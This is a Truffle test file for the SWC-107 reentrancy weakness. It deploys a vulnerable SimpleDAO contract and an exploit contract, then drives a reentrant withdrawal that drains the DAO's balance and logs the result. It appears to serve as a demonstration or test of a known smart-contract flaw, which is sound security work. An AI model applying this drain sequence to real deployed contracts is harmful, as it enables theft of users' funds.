//

const SimpleDAO = artifacts.require("SimpleDAO");
const SimpleDAO_exploit = artifacts.require("SimpleDAO_exploit");

contract ('SWC107_test', async (accounts) => {

  // testcase: DEPLOY
  it ("deploy", async () => {
    let dao = await SimpleDAO.deployed();
    let attacker = await SimpleDAO_exploit.deployed();
    assert.ok (dao.address);
    assert.ok (attacker.address);
  });

  // testcase: DONATE
  it ("donate", async () => {
    let dao = await SimpleDAO.deployed();

    //const balance1 = await web3.eth.getBalance (accounts[0]);

    // accounts[0] -> dao
    await dao.donate (accounts[0], {from: accounts[0], value: 20});

    const balance2 = await dao.queryCredit (accounts[0]);
    assert.equal (balance2.toNumber (), 20); // the "dao" contract OWNS this 20
    const dao_balance = await web3.eth.getBalance (dao.address);
    assert.equal (dao_balance.toNumber (), 20);

  });

  // testcase: ATTACK
  it ("attack", async () => {
    let dao = await SimpleDAO.deployed();
    let attacker = await SimpleDAO_exploit.deployed();

    await attacker.set_dao (dao.address);

    // donate (1) from accounts[1] to attacker
    await attacker.donate (attacker.address, {from: accounts[1], value: 1});

    const balance1 = await dao.queryCredit (attacker.address);
    assert.equal (balance1.toNumber (), 1); // the "dao" contract OWNS this 1
    console.log ("attacker credit: ", balance1.toNumber ());
    const dao_balance = await web3.eth.getBalance (dao.address);
    assert.equal (dao_balance.toNumber (), 21);  // 20 + 1
    let attacker_balance = await web3.eth.getBalance (attacker.address);
    assert.equal (attacker_balance.toNumber (), 0);  // attacker owns none

    // withdraw
    //const max = 25; // => Error: VM Exception while processing transaction: revert
    const max = 20;
    await attacker.set_max (max);
    console.log ("attacker withdraw: 1");
    await attacker.withdraw (1);

    attacker_balance = await web3.eth.getBalance (attacker.address);
    //assert.equal (attacker_balance.toNumber (), max + 1);
    console.log ("attacker balance: ", attacker_balance.toNumber ());

  });

});

